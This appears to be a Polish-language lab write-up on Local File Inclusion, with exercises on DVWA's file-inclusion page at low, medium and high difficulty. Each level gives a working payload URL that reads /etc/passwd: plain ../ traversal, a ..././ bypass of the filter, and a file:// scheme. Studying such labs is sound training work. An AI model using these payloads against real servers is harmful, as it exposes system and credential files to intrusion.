# LFI - Local File Inclusion
## Opis techniki
<blockquote>Local File Inclusion (LFI) występuje, gdy aplikacja nie weryfikuje i nie filtruje poprawnie danych dostarczanych przez użytkownika, które są używane do wczytania lub uruchomienia lokalnych plików. Atakujący może wykorzystać tę lukę, wstrzykując specjalnie spreparowane dane, aby osiągnąć następujące cele:

* Odczyt poufnych informacji: Atakujący może próbować odczytać poufne informacje, takie jak pliki konfiguracyjne, hasła, klucze prywatne lub inne wrażliwe dane przechowywane na serwerze. Dołączając te pliki, atakujący może uzyskać dostęp do tych poufnych informacji.
* Wykonanie kodu: Jeśli aplikacja webowa uruchomi załadowane pliki, atakujący może próbować dołączyć złośliwy kod, który zostanie wykonany na serwerze. Może to prowadzić do naruszenia bezpieczeństwa serwera, wykonywania dowolnych poleceń, a nawet zdalnego wykonywania kodu.
* Ataki na infrastrukturę: LFI może być wykorzystywane jako część szerszego ataku na infrastrukturę. Atakujący może dołączyć pliki systemowe, takie jak /etc/passwd lub /etc/shadow, w celu zebrania informacji o użytkownikach lub innych poufnych danych systemowych. Informacje te mogą być następnie wykorzystane do dalszych działań w ramach ataku.</blockquote>

## DVWA labs

- [DVWA LFI #1 - Low](#dvwa-lfi-1---low)

- [DVWA LFI #2 - Medium](#dvwa-lfi-2---medium)

- [DVWA LFI #3 - High](#dvwa-lfi-3---high)


<br/>

## DVWA LFI #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Brak filtrowania


#### Przykładowy link powodujący zwrócenie pliku /etc/passwd 
<http://10.10.14.17/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd>

#### Efekt kliknięcia w link:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_023627751.png "Po kliknięciu w link zwrócona zostanie zawartość pliku /etc/passwd")

#### Żądanie i odpowiedź:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_024052411.png "Żądanie i odpowiedź zdradzająca zawartość pliku /etc/passwd")


<br/>

<br/>
<br/>

## DVWA LFI #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie polegające na wycinaniu `../`, `.."` oraz `http://` i `https://`


#### Przykładowy link powodujący zwrócenie pliku /etc/passwd 
<http://10.10.14.17/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././etc/passwd>

#### Efekt kliknięcia w link:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_023814218.png "Po kliknięciu w link zwrócona zostanie zawartość pliku /etc/passwd")

#### Żądanie i odpowiedź:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_024109936.png "Żądanie i odpowiedź zdradzająca zawartość pliku /etc/passwd")

<br/>

<br/>
<br/>

## DVWA LFI #3 - High
Na wysokim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane wejściowe muszą zaczynać się od `file`


#### Przykładowy link powodujący zwrócenie pliku /etc/passwd 
<http://10.10.14.17/vulnerabilities/fi/?page=file:///etc/passwd>

#### Efekt kliknięcia w link:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_023943467.png "Po kliknięciu w link zwrócona zostanie zawartość pliku /etc/passwd")

#### Żądanie i odpowiedź:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_024124518.png "Żądanie i odpowiedź zdradzająca zawartość pliku /etc/passwd")

<br/>
